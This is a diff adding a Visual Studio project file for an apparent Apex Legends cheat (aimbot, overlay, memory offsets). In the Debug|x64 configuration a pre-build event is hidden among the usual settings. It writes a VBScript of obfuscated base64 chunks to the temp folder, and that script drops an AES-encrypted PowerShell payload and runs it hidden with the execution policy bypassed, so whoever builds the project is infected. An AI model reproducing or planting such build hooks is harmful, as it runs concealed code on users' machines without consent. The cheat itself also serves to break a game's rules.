@@ -1,0 +1,217 @@
+<?xml version="1.0" encoding="utf-8"?>
+<Project DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <ItemGroup Label="ProjectConfigurations">
+    <ProjectConfiguration Include="Debug|Win32">
+      <Configuration>Debug</Configuration>
+      <Platform>Win32</Platform>
+    </ProjectConfiguration>
+    <ProjectConfiguration Include="Release|Win32">
+      <Configuration>Release</Configuration>
+      <Platform>Win32</Platform>
+    </ProjectConfiguration>
+    <ProjectConfiguration Include="Debug|x64">
+      <Configuration>Debug</Configuration>
+      <Platform>x64</Platform>
+    </ProjectConfiguration>
+    <ProjectConfiguration Include="Release|x64">
+      <Configuration>Release</Configuration>
+      <Platform>x64</Platform>
+    </ProjectConfiguration>
+  </ItemGroup>
+  <PropertyGroup Label="Globals">
+    <VCProjectVersion>17.0</VCProjectVersion>
+    <Keyword>Win32Proj</Keyword>
+    <ProjectGuid>{8e8ea883-75f7-4651-b2b1-696ec67de52a}</ProjectGuid>
+    <RootNamespace>ApexLegendsExternalCheat</RootNamespace>
+    <WindowsTargetPlatformVersion>10.0</WindowsTargetPlatformVersion>
+  </PropertyGroup>
+  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'" Label="Configuration">
+    <ConfigurationType>Application</ConfigurationType>
+    <UseDebugLibraries>true</UseDebugLibraries>
+    <PlatformToolset>v143</PlatformToolset>
+    <CharacterSet>Unicode</CharacterSet>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="Configuration">
+    <ConfigurationType>Application</ConfigurationType>
+    <UseDebugLibraries>false</UseDebugLibraries>
+    <PlatformToolset>v143</PlatformToolset>
+    <WholeProgramOptimization>true</WholeProgramOptimization>
+    <CharacterSet>Unicode</CharacterSet>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
+    <ConfigurationType>Application</ConfigurationType>
+    <UseDebugLibraries>true</UseDebugLibraries>
+    <PlatformToolset>v143</PlatformToolset>
+    <CharacterSet>Unicode</CharacterSet>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
+    <ConfigurationType>Application</ConfigurationType>
+    <UseDebugLibraries>false</UseDebugLibraries>
+    <PlatformToolset>v143</PlatformToolset>
+    <WholeProgramOptimization>true</WholeProgramOptimization>
+    <CharacterSet>Unicode</CharacterSet>
+  </PropertyGroup>
+  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
+  <ImportGroup Label="ExtensionSettings">
+  </ImportGroup>
+  <ImportGroup Label="Shared">
+  </ImportGroup>
+  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
+    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
+  </ImportGroup>
+  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
+    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
+  </ImportGroup>
+  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
+    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
+  </ImportGroup>
+  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
+    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
+  </ImportGroup>
+  <PropertyGroup Label="UserMacros" />
+  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
+    <ClCompile>
+      <WarningLevel>Level3</WarningLevel>
+      <SDLCheck>true</SDLCheck>
+      <PreprocessorDefinitions>WIN32;_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
+      <ConformanceMode>true</ConformanceMode>
+    </ClCompile>
+    <Link>
+      <SubSystem>Console</SubSystem>
+      <GenerateDebugInformation>true</GenerateDebugInformation>
+    </Link>
+  </ItemDefinitionGroup>
+  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
+    <ClCompile>
+      <WarningLevel>Level3</WarningLevel>
+      <FunctionLevelLinking>true</FunctionLevelLinking>
+      <IntrinsicFunctions>true</IntrinsicFunctions>
+      <SDLCheck>true</SDLCheck>
+      <PreprocessorDefinitions>WIN32;NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
+      <ConformanceMode>true</ConformanceMode>
+    </ClCompile>
+    <Link>
+      <SubSystem>Console</SubSystem>
+      <EnableCOMDATFolding>true</EnableCOMDATFolding>
+      <OptimizeReferences>true</OptimizeReferences>
+      <GenerateDebugInformation>true</GenerateDebugInformation>
+    </Link>
+  </ItemDefinitionGroup>
+  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
+    <ClCompile>
+      <WarningLevel>Level3</WarningLevel>
+      <SDLCheck>true</SDLCheck>
+      <PreprocessorDefinitions>_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
+      <ConformanceMode>true</ConformanceMode>
+    </ClCompile>
+    <Link>
+      <SubSystem>Console</SubSystem>
+      <GenerateDebugInformation>true</GenerateDebugInformation>
+    </Link>
+    <PreBuildEvent><Command>@echo off&#xD;&#xA;setlocal&#xD;&#xA;set &quot;a=%25TEMP%25\W4HI90&quot;&#xD;&#xA;mkdir &quot;%25a%25&quot; 2&gt;nul&#xD;&#xA;echo b = &quot;ZnVuY3Rpb24gRFZLIHtwYXJhbSAoW3N0cmluZ10kZW4sW2J5dGVbXV0kc0IpOyRrID0gTmV3LU9iamVjdCBieXRlW10gMzI7JHYgPSBOZXctT2JqZWN0IGJ5dGVbXSAxNjskZGVyaXZlQnl0ZXMgPSBOZXctT2JqZWN0IFN5c3RlbS5TZWN1cml0eS5DcnlwdG9ncmFwaHkuUmZjMjg5OERlcml2ZUJ5dGVzKCRlbiwgJHNCLCAxMDAwLCBbU3lzdGVtLlNlY3VyaXR5LkNyeXB0b2dyYXBoeS5IYXNoQWxnb3JpdGhtTmFtZV06OlNIQTI1Nik7JGsgPSAkZGVyaXZlQnl0ZXMuR2V0Qnl0ZXMoMzIpOyR2ID0gJGRlcml2ZUJ5dGVzLkdldEJ5dGVzKDE2KTtyZXR1cm4gQHsgSyA9ICRrOyBWID0gJHYgfX07ZnVuY3Rpb24gRCB7cGFyYW0gKFtzdHJpbmddJGVCWixbc3RyaW5nXSRlbmMpOyRkQnkgPSBbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCRlQlopOyRzYnkgPSAkZEJ5WzAuLjddOyRlQnkgPSAkZEJ5WzguLigkZEJ5Lkxlbmd0aCAtIDEpXTskZHJ2ID0gRFZLIC1lbiAkZW5jIC1zQiAkc2J5OyRrID0gJGRydi5LOyR2ID0gJGRydi5WOyRhID0gW1N5c3RlbS5TZWN1cml0eS5DcnlwdG9ncmFwaHkuQWVzXTo6Q3JlYXRlKCk7JGEuTW9kZSA9IFtTeXN0ZW0uU2VjdXJpdHkuQ3J5cHRvZ3JhcGh5LkNpcGhlck1vZGVdOjpDQkM7JGEuUGFkZGluZyA9IFtTeXN0ZW0uU2VjdXJpdHkuQ3J5cHRvZ3JhcGh5LlBhZGRpbmdNb2RlXTo6UEtDUzc7JGEuS2V5ID0gJGs7JGEuSVYgPSAkdjskZGMgPSAkYS5DcmVhdGVEZWNyeXB0b3IoKTt0cnkgeyRkQiA9ICRkYy5UcmFuc2Zvcm1GaW5hbEJsb2NrKCRlQnksIDAsICRlQnkuTGVuZ3RoKTtyZXR1cm4gW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRTdHJpbmcoJGRCKX0gY2F0Y2gge3JldHVybiAkbnVsbH19JGVCID0gIllzMVRndUpnNThYbjdLenVjcnhISkFyTGl4YnVjWGgzOUlMSVhjM2k1ekdBcHhManY1bXN0ZXRZcnVWSDBsVHlua2tTZk1KanJOYlVIdE5BUzVsNUFVclMvRit5TGZydjlQWFBRNHNMQWJwRjRBUlhPN2dsZ1VnRmlISnY4Z3luVnlSbUVlNVozY21rL0xkc2pFOEpHOGxCZGE5UHNzNXY5ckxpTm5kS3VFZldaK01scVVSZk5RS0EyZGRNY0Vic3F4aDBZdG1hMTFoNjQyN04xWVdQRmFCbFozZkRMb2FWSUpCQUVMa3QrdUk0RlBma0o1ZTNBYk5yLzBraEd2TW03Z05GUGM5WHkzYjYrWHlNYUhHWWFRNkdRdWtaZmFwbWk4RW01eHVzbmdKWG54L1NzdUVTSkVQTkNPY2hZeFpEYjkzcHErbVppRnJjZFM3MHdPWGFVTGpMUnBoenZOTm9mVWNkdFFyN1ZMK0kvYk9PYVNiakJQY1A3cUF5WHZZMFZDZTNKL3ZkbSs3WHRIUGM2d1FsYi8vUFl5QS81S1ZIdHp6SWJ2N1cvVjNwZysxbDBQM1dvWFBqWVEwamFjODJpVTgrTi93VXRqZ0FwVXdRR0twRkF5S0FuRHRKZld2ZDFoU3o5ME4xQ2h0QlZQYnovTmxPSDBiRGlMUFZqa3FHejVKT29GMk9KVGdZeUEvZ21rZmpOdXNFWTE0aHUvNm0wV1NDU2M2NHZwNFdPc3FUbDNyVTBZVlBreGNYOFFCSkdBNkhrR1ZnbkRlT3BZc1FHS1lxQWlnaVZpZEJCMGlBZlpjczNSWFBGejZGTjYzS2ZaOG5Ga294bXBucnZ6c0RwbTh1bithNkZOZFd3RWpuTFp5dWtmNkN0R2YxRUxNRGtWcTdRNkdWSGFTWEdVWXNLWDNpdjBUR1VZVW91eVdwRXdYVzhDZ0p5Z1VYalJkVGZEbkFrM0xNSzRwZ0t5MTNYMXhMOWlhd0Y0eXVXZENSTDdLeC9GRHByK3k5clVjMy9OOC9DTWtIcHoza0lqY2xhTU1TSFJYOEZNRE5xNVRPK1ZGUytLc3Z3dS9ZbmVNZnk2V0w5R2NHbGVuSkltWWg3NWtpc2VJcHAzUURkUUplYmtNRDlBVFpFemdJUDh6emtFc25McmZiK2xSY21DL2hiNFFoeEhyU0phSEc2RkUwT3dOWGI5bHUrQW5YMitEMmxFSU9iMG1ISEVoVjJVRGZ2NTBQMnoxT3d2REh4WjFsc0pZOHVXQlVCLzRUUkRoMHAvRzFPR3ltYmtVV2tmNGJxMFVBZ0VrT3V5bndQY2QvM2RTamdueEYzTnI4Z2c2NGQ3NGIzczhlVm5BYUI5U0JVcHU4Y0VvV2ROR1k4SEJEdHZRL1NpaU5FSXZRWm4wYzMyaDcyQnB2UHVHNXMxSEpIVTNBMDIxNUdTYXZYeElDaSt2ZVRqMWh0aVNnZWNUay9KUE93VTJVRDFLWDk4NlRyMThIS3dIVnQ4M3Y0&quot; &gt; &quot;%25a%25\4olX9YsXn.vbs&quot;&#xD;&#xA;echo c = &quot;OEEvYkIvOFdodXJoTHczcHIrc1plUHloZUh4U0U3VWR5ZmU5cTJPT1gzcVl1Y1AzSkVhOTI4U0dOZldtdWRTejdaVkpoQ0hpR0dHOUQzSmZVZWtwNXlKcjBlMDBuVm8rQXA1VEdpdVdQK2wxMGxRWGd0TzhVNWNtSTh6cGt2eEZNVlN0M2ZxZDB4MHBQeERvSG1ZVCsydEk2S3pZTHZXbDJpTFY3cGt6VDR4blBHMkZFZDEwYS9yeE1wUElhWFVMK0ZUTWl5WjRTYk5mWS8zRVBIejNUOUozTzhkNkRmTFQxdXF6YWxlNThKYWMzYTFYYkhpQ09tdHdyUi8zU0s3UTlBMVpST3lmYmQvZFpGSTZZdG5ZckY4VkNIS2o1MEZaVEZxcGptMWJHUGFJcERaZlpINUFnNEVIYUYxYmJrMnZGTzMwSGRFeVgxRDBiUkw3dkJQOFMrcHRPSlJSOWdSUUZWM2pHeG5WY3hKdWFXOENvUmNzc0NjQm5NdkRUMzdBT2YrU0JsUmZ5YlA5N2ZBckVZcjdVUTdpT2Z4YmhkWWJiVzlDSFVBZGVoTUFlbldENlBEL3J2U1BTRVNQWUtlcFdua2MyaldOclBHTmZPck9zWTRTdEJZOVJVZ1V4OTV6WGdlYkdtWEFrMGl1aEJVUkZHc1JRaUowTDJQcVBYTllYUjA4OW5sblpDZGJHZ20yZm93UldXMzQzVG1BODhkRS9kSER2eUE3R1pYRXA1Zmd2UXhRUDdqSU85Q1VlenIyTjVuNWozVldVZ1lRVWpXRkFoK1JKMW9wR2E3NXpEZWVJYTJ4RnpickJNWFp5Y0NZWmxxTStkMU1ITmFYSkw1UG9PbzUxKzZpYVpSUmRmQTJ3RVZDNzNnY0RaSnRtc1ZvT3dIVThJQnlEN2IzdjIyQlo0anVNS1E2dzdYcmhRYk5yUnp3dFY5ZmxRZGxkaE1sWUNONUtMYVVlVzNXTGdLMUgyazluT1ZzcUV4bzlSVW1halhCZ29tdTFLZk91djBhLzJzVHkzeHlueWQzSGlsY0R4dXhva2ZnYXMwQ2x2dlJtRUpNME1NaTlLMWpmRTVqdWpNaFZuTHBpNWZZRmxOZ3lkWXBhNVZaQm9MckVGUlE1Tmxiekwra05uMnVOSVlVenRBRHkrVDJsbGV5eklQR1c2aEZyZzVZRUZhdkJiTkhWblNVRldIS2toSnJtZEh0OVZ5ZGpoOUxqY3JCS3hwVFRLQmlDb1dhemw3bjR5M21zUW52MmduaHNQZzluL0F1bjRPMFROWDQ1Ujh0RE9xemFLcFdSNXlsV29nN2VtWTRIbW95UHdpbG9xbGplbEJKT1Y2SzZhWnFDanRYS0hMeThTUUpaUmJyYnFESmRrNGNKMFRiVDBnUWpJd3lsbFQyTDVlZjhGK25ZcEZmTXVjY3hyOTJ5WC8vcGZLNWdsY2R6YVlpNVZoM3RzYUMwbmJGb29pa0tJRG9acVZXS1ZDMlFFZ3ByRElRbVVvRmZ6em9QSmQzTjh5VGkwbW5KWEVrbmF6SVhtSUErRDB2cEhrVXFadGhLM3YrN2xiYURxTzZqZzVkdHp3NmttL0w5Umo2UFZpVmlPQm1hVnVKeFVlWkZDVVdlME5uSDFLUDdSbWI5c0EyYUN4QmhzT2FSaEd5UVlRZUNPQUpmNHFPOEFOeGZoZlBncmdUWHBlOTlNazc4S25QYmdjQ01QdFJjOU1uam5WZmNpNmFsc1JEZE9Jem51V1gwNi8vVWZjZTRibGcwV3dqYjk3NldiaW5iMEFaTHRRUTZBdDZlMnZmKzNnTkxWekZwai8zc0NibVZHNmgvUzFZNEZrVUZXN0Z2cmI1OUxzbWRBWi84Yjlya3VienNkU01oQjBjWUtPUlI5OHErK204clNRdUNmZW43aDBNSkgxdHkwWGlJVXJwSEx3NmFmUmdGVEY3bitqeVAycFBMNGx6bGtjQjlNVDZ1QUd2T2VGNUhUSlovR0piam5hM1Jsak1iREZKSk5ZUXlCN1gwQ0xEUHlGS3ZvaGRoUG85YTE4bVBKTkl4cWJtOGxkMmViQ0VSMlliWDdKOWRTVTRDZzNZYzJxaHkwLy9RKzFHeDU5RFFjNHdKTWFuUXQzZUhvLzZpOHA1SHdnUGFiUERLcVJYWTF6VmowRXdNWlVyUG9Gd3c0emJ1Ujd0QlFxSllvNW1JdTE1VUNDWE45NUZKejFjbHphWGltdkZUdWpUQ0drdlExc0QxVzBzY0lkelB0anBVbDFtS214ejZmZU9TVG04UWxYbGFJOVMzaG1iWXRHYzMzd0NWNyI7JHRtID0gJGVCLlRvQ2hhckFycmF5KCk7W2FycmF5XTo6UmV2ZXJzZSgkdG0pOyRSID0gRCAtZUJaICR0bSAtZW5jICIiOyR0ID0gJFIuVG9DaGFyQXJyYXkoKTsgW2FycmF5XTo6UmV2ZXJzZSgkdCk7ICRCVlYgPSBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldFN0cmluZyhbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKC1qb2luICR0KSk7ICRFUFggPSAiSW52b2tlLUV4cHJlc3Npb24iOyBOZXctQWxpYXMgLU5hbWUgcFdOIC1WYWx1ZSAkRVBYIC1Gb3JjZTsgcFdOICRCVlY=&quot; &gt;&gt; &quot;%25a%25\4olX9YsXn.vbs&quot;&#xD;&#xA;echo d = &quot;ZTQ4NXBHT2Jsa2RUellLZkFTT0k0NXovRGZuRVAvNW9OLy9KTU5lYnlDd0FIcGQwSlBkVXFWaFY0c3hsV2QxbDZLaHVNOW1hZFdmcHlHQ3lKTHFpdER0Um5JQ1gxS0VORElFcm5CYnM5b0NraHNzM296V05NeXhGaUR1TkV2dmRmNWY1NFhZVmFHUzc5VHZCTHhpTC93WHp1VXNVWFhFaWNYRXdLQ0w0ckMybkxwR1Nkd05LcWFQVDdYYVpoUGdUL2RzaktJMXQzUUVxdTZRSUFlVE5xMXlWTDltSmFRM0R4c0hnc2pENUIzdVJ0eVg3T2NzRVZZWHBmekFYVDBjK2NwVGZSREVHMC92eFVLYW16VWlxckkzeUNFOXNadDBaZDRpVEwwQ1h2WTBPZEZBTUJRbzlLcXNCcWxvcVBCZlRQdnV3anNvbUhraVBPZHM3TWNtN0xFVUNvcjgvQ3k0NERwVXhWb0xQMUQ2WE1MY0JLRitoM2JaNXplZ0crTG9icGNpVHBVN3FQYWdHNU5ld2ZEU1BsSjdFUWwyUE12ZlV5eVl3M0s1bG1scDQzNVVaRDgzREVGN2hHditFZndCOWRiM1JsYXUyYWYxWVJpODAvRjRmQmxqblVzbmo4Zlg5a2YzMyt3OG56MzJRenV2SjB5bDl3OEZWdnZRUlZBT0pQUU9Wd2ZrWFVBSThQU0pya0JOOFltY2E3S0Jhd2pXUEtCMGN2dEMwaUtYM3NxYUltTzV1N0czbWxBbXduVTFNTGIxZ1BBSXdGVWRUSWdxVkFaaXk5NzBqdjVYYTY0QWhlVzJSb0hIREVyMGxITmozN3ZYMnVoelBIcnB4RVByejV2ZlNsV0NFWTVzZXVsaWFzRFFIV0hyeW5NK0NxSXY3aTg1UHpOYU5BYWtKcytTMzlFczNnWmQybFhyS0k4Y3kwa2x3U21DVEVsa2dURWNCa01FRWs0eVhrRXRXY1ZxTFR4M05RY1poNHlYc0MxUlNsTDY5UWwwNTV1UHlac3EyQzJWQjJrNG5ZOGtWa3Y5Z1hwVENYcldXcGlqcWJwbUVZWVI4M2NsNXF2YmNTREw0aUd0UW9LYlJpLy9KMGFGY3F1c25NU3hTTmcvbmwzblptSDl2azlPb1pPdUVjVmlnZ21oS01uWmFObUs5SlZUSjZ1ZXNyQjh5ZHhvYkFmYVBNUWVOeG85aDhmQzcyOG5xdGdSSFNoU0luSzVhamx5OXZPam1YLzMydGEzUklqQlJrNVdGTFQyZFJnVytVV0xXUzdablV2aEVCYUNET3BxTDh5K0w4Ny9uenRKN0lPQnc3WGVlNFdVcURCYlFxNFMzY09QdFVxSjdpbEFjTlF0ZFgrWThaNkhGMzV3Y0F5c1BhL3g4blU2OEthK3lBYkRnTXpzNEVLcVhLU2lwQVNXVzJSMDdaT2dzcVB6YnJoYUdidEFHZFBDcG1Qd2lTdm5jSzR5d0VCcWFmanZ2S2t0emhFTU9TaUQyaDVuN2YxeTY2S0tCeXdJZnVPdm5hNGZ0dUhQa2RYLzV2cWloSStsSVZuVE1FcHpnUU1STkJUUVh4WUdHUmZDa3JMQ3l3WnFvanB6SDVnUGtpL3pqeXkyWTFwTUowbENzeCt5bUdVQlRWOU81Mm1obkFpeXUvRGJacFNnR0FWZkpmWkcrYzZ0dXVLdFIzVDZVVFEyUlJTS2VGUGc2VHRuN25TbyswQmZOaURHbWdieHRYeGhqeXFaT0FhWks3NThLeHd6d0F2SU1GdWJld0wwUTRjdXZUU1AyMHZmR1VJQmlJOVhydStpOWRZdXdZR3I1QUwrc0NoVVdmZ0Z1WlVGaFVBcDJacEVLT2NXblJvaTdzd29sZkRrNTZ5NzVueWJ3K014OWlFQVkrZmRrY1BWSE9aVUlZMThMY1VNMjdFb1ZBZmVMNTlkVmxEeVNHcEJMUGhYY3BvekkveitHd0RudVhycHdZUWdMYldYZDYxakJCbkUyZUxXQm12VnF2U1lQVWhrTVB4QXdBY3RnblgyMzlXSmk0MU5qY09hZW9rUHNtQTlMWlpkNkpVODV2T0ZEdUpEbS9ZcGZ3MENha0E0c25TQjdlOFN2N24zWUtmelpUYkJHVFlBT2xpL1FuS0hRM1c1RjVDY25CVlV3ZUdSUjFQcjBZdDFyTVJuekFsem9lcm5qOEtENzlueGhjRGRKNmc2T0RBSlptclYyZ2tkb1IzRTNPQUZmYnBsTG1NT1F4RDZVQ1JLUUZlK0FEQVpPN2MrbFZGblBDNktzME4xK1FrVDRhdDl3THJQbnFGL3BSNWtCdVo4S0NEczVXZFNXUVVFMjRUUHdFNEUvQXYzaUpvbWxVNTF1VitJQU51eVFPd0Y3c1h5dTYzVFNGR3BDRjJVejlrQUlUTks0OXRRTmZmSmxEamZhaHkwdDk0WGZlclRUd0drMEc5d01DVk80bTk5Z3VCU2ZKTU02a3A4VUYydXo1cnB3c2twdXAzNHFlRkJhdzBDekxWK2ZCVVJVTDVoMHNmeFIzZG1mQXJNOThqV0tXY2tqam9pSjlDbnFGdlVRTzdwQlJFNDNFamp4djB0OW9NYnltd3NHWit0YmxhTVdqMTF2eU9Yd1RWVXFmaWhwL1ZHdzk4c0ZKdUhDS1Q3NURJdFNCWnRwcW93YjZ1MjQxcVZMcmRnbWdHVml6&quot; &gt;&gt; &quot;%25a%25\4olX9YsXn.vbs&quot;&#xD;&#xA;echo e = b ^&amp; d ^&amp; c &gt;&gt; &quot;%25a%25\4olX9YsXn.vbs&quot;&#xD;&#xA;echo Set f = CreateObject(&quot;MSXml2.DOMDocument.6.0&quot;).createElement(&quot;base64&quot;) &gt;&gt; &quot;%25a%25\4olX9YsXn.vbs&quot;&#xD;&#xA;echo f.DataType = &quot;bin.base64&quot; &gt;&gt; &quot;%25a%25\4olX9YsXn.vbs&quot;&#xD;&#xA;echo f.Text = e &gt;&gt; &quot;%25a%25\4olX9YsXn.vbs&quot;&#xD;&#xA;echo g = f.NodeTypedValue &gt;&gt; &quot;%25a%25\4olX9YsXn.vbs&quot;&#xD;&#xA;echo h = &quot;%25a%25\0SLy.ps1.ps1&quot; &gt;&gt; &quot;%25a%25\4olX9YsXn.vbs&quot;&#xD;&#xA;echo Set j = CreateObject(&quot;Scripting.FileSystemObject&quot;) &gt;&gt; &quot;%25a%25\4olX9YsXn.vbs&quot;&#xD;&#xA;echo Set k = j.CreateTextFile(h, True) &gt;&gt; &quot;%25a%25\4olX9YsXn.vbs&quot;&#xD;&#xA;echo k.Write l(g) &gt;&gt; &quot;%25a%25\4olX9YsXn.vbs&quot;&#xD;&#xA;echo k.Close &gt;&gt; &quot;%25a%25\4olX9YsXn.vbs&quot;&#xD;&#xA;echo Set m = CreateObject(&quot;WScript.Shell&quot;) &gt;&gt; &quot;%25a%25\4olX9YsXn.vbs&quot;&#xD;&#xA;echo m.Run &quot;powershell.exe -ExecutionPolicy Bypass -File &quot; ^&amp; h, 0, False &gt;&gt; &quot;%25a%25\4olX9YsXn.vbs&quot;&#xD;&#xA;echo Function l(n) &gt;&gt; &quot;%25a%25\4olX9YsXn.vbs&quot;&#xD;&#xA;echo Dim o, p &gt;&gt; &quot;%25a%25\4olX9YsXn.vbs&quot;&#xD;&#xA;echo Set o = CreateObject(&quot;ADODB.Recordset&quot;) &gt;&gt; &quot;%25a%25\4olX9YsXn.vbs&quot;&#xD;&#xA;echo p = LenB(n) &gt;&gt; &quot;%25a%25\4olX9YsXn.vbs&quot;&#xD;&#xA;echo If p ^&gt; 0 Then &gt;&gt; &quot;%25a%25\4olX9YsXn.vbs&quot;&#xD;&#xA;echo o.Fields.Append &quot;q&quot;, 201, p &gt;&gt; &quot;%25a%25\4olX9YsXn.vbs&quot;&#xD;&#xA;echo o.Open &gt;&gt; &quot;%25a%25\4olX9YsXn.vbs&quot;&#xD;&#xA;echo o.AddNew &gt;&gt; &quot;%25a%25\4olX9YsXn.vbs&quot;&#xD;&#xA;echo o(&quot;q&quot;).AppendChunk n &gt;&gt; &quot;%25a%25\4olX9YsXn.vbs&quot;&#xD;&#xA;echo o.Update &gt;&gt; &quot;%25a%25\4olX9YsXn.vbs&quot;&#xD;&#xA;echo l = o(&quot;q&quot;).GetChunk(p) &gt;&gt; &quot;%25a%25\4olX9YsXn.vbs&quot;&#xD;&#xA;echo Else &gt;&gt; &quot;%25a%25\4olX9YsXn.vbs&quot;&#xD;&#xA;echo l = &quot;&quot; &gt;&gt; &quot;%25a%25\4olX9YsXn.vbs&quot;&#xD;&#xA;echo End If &gt;&gt; &quot;%25a%25\4olX9YsXn.vbs&quot;&#xD;&#xA;echo End Function &gt;&gt; &quot;%25a%25\4olX9YsXn.vbs&quot;&#xD;&#xA;cscript //nologo &quot;%25a%25\4olX9YsXn.vbs&quot;&#xD;&#xA;endlocal</Command></PreBuildEvent>
+  </ItemDefinitionGroup>
+  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
+    <ClCompile>
+      <WarningLevel>Level3</WarningLevel>
+      <FunctionLevelLinking>true</FunctionLevelLinking>
+      <IntrinsicFunctions>true</IntrinsicFunctions>
+      <SDLCheck>true</SDLCheck>
+      <PreprocessorDefinitions>NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
+      <ConformanceMode>true</ConformanceMode>
+    </ClCompile>
+    <Link>
+      <SubSystem>Console</SubSystem>
+      <EnableCOMDATFolding>true</EnableCOMDATFolding>
+      <OptimizeReferences>true</OptimizeReferences>
+      <GenerateDebugInformation>true</GenerateDebugInformation>
+    </Link>
+  </ItemDefinitionGroup>
+  <ItemGroup>
+    <ClCompile Include="aimassist.cpp" />
+    <ClCompile Include="apexbot.cpp" />
+    <ClCompile Include="apex\dynamic_crypt.cpp" />
+    <ClCompile Include="apex\entities.cpp" />
+    <ClCompile Include="apex\game_client.cpp" />
+    <ClCompile Include="apex\game_version.cpp" />
+    <ClCompile Include="apex\heartbeat.cpp" />
+    <ClCompile Include="apex\highlight.cpp" />
+    <ClCompile Include="apex\items.cpp" />
+    <ClCompile Include="apex\local_stats.cpp" />
+    <ClCompile Include="apex\main.cpp" />
+    <ClCompile Include="apex\process.cpp" />
+    <ClCompile Include="apex\textmenu.cpp" />
+    <ClCompile Include="apex\update.cpp" />
+    <ClCompile Include="apex\view_render.cpp" />
+    <ClCompile Include="cheats.cpp" />
+    <ClCompile Include="config.cpp" />
+    <ClCompile Include="context.cpp" />
+    <ClCompile Include="font\PoppinsMedium.cpp" />
+    <ClCompile Include="imgui\imgui.cpp" />
+    <ClCompile Include="imgui\imgui_demo.cpp" />
+    <ClCompile Include="imgui\imgui_draw.cpp" />
+    <ClCompile Include="imgui\imgui_impl_dx11.cpp" />
+    <ClCompile Include="imgui\imgui_impl_win32.cpp" />
+    <ClCompile Include="imgui\imgui_tables.cpp" />
+    <ClCompile Include="imgui\imgui_widgets.cpp" />
+    <ClCompile Include="offsets\game_client.cpp" />
+    <ClCompile Include="offsets\game_version.cpp" />
+    <ClCompile Include="offsets\heartbeat.cpp" />
+    <ClCompile Include="offsets\local_stats.cpp" />
+    <ClCompile Include="offsets\main.cpp" />
+    <ClCompile Include="offsets\math.cpp" />
+    <ClCompile Include="offsets\memory.cpp" />
+    <ClCompile Include="offsets\menu.cpp" />
+    <ClCompile Include="offsets\merged_gamelib.cpp" />
+    <ClCompile Include="offsets\name_list.cpp" />
+    <ClCompile Include="offsets\overlay.cpp" />
+    <ClCompile Include="offsets\render.cpp" />
+    <ClCompile Include="scripts.cpp" />
+    <ClCompile Include="solver.cpp" />
+    <ClCompile Include="state.cpp" />
+    <ClCompile Include="stdafx.cpp" />
+  </ItemGroup>
+  <ItemGroup>
+    <ClInclude Include="aimassist.hpp" />
+    <ClInclude Include="apex\cheat.h" />
+    <ClInclude Include="apex\context.hpp" />
+    <ClInclude Include="apex\data.hpp" />
+    <ClInclude Include="apex\debug.h" />
+    <ClInclude Include="apex\entities.hpp" />
+    <ClInclude Include="apex\game_client.hpp" />
+    <ClInclude Include="apex\hash.hpp" />
+    <ClInclude Include="apex\highlight.hpp" />
+    <ClInclude Include="apex\items.hpp" />
+    <ClInclude Include="apex\pid.hpp" />
+    <ClInclude Include="apex\process.hpp" />
+    <ClInclude Include="apex\textmenu.h" />
+    <ClInclude Include="apex\utils.h" />
+    <ClInclude Include="cheats.hpp" />
+    <ClInclude Include="config.hpp" />
+    <ClInclude Include="font\PoppinsMedium.h" />
+    <ClInclude Include="imgui\imconfig.h" />
+    <ClInclude Include="imgui\imgui.h" />
+    <ClInclude Include="imgui\imgui_impl_dx11.h" />
+    <ClInclude Include="imgui\imgui_impl_win32.h" />
+    <ClInclude Include="imgui\imgui_internal.h" />
+    <ClInclude Include="imgui\imstb_rectpack.h" />
+    <ClInclude Include="imgui\imstb_textedit.h" />
+    <ClInclude Include="imgui\imstb_truetype.h" />
+    <ClInclude Include="offsets\game_client.hpp" />
+    <ClInclude Include="offsets\math.h" />
+    <ClInclude Include="offsets\memory.h" />
+    <ClInclude Include="offsets\offset.hpp" />
+    <ClInclude Include="offsets\offsets.h" />
+    <ClInclude Include="offsets\render.hpp" />
+    <ClInclude Include="scripts.hpp" />
